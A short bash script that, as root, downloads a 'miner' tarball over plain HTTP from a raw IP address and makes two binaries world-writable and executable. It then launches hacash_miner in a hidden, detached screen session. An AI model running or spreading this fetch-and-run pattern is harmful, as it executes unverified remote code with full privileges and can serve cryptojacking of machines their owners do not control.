#!/bin/bash
sudo -i <<EOF
wget http://138.3.223.215:8000/miner.tar.gz
tar -xvf miner.tar.gz
cd miner/
chmod 777 ./hacash_miner ./xde18
screen -dmS hac
screen -x -S hac -p 0 -X stuff "./hacash_miner \n"
echo ok
EOF
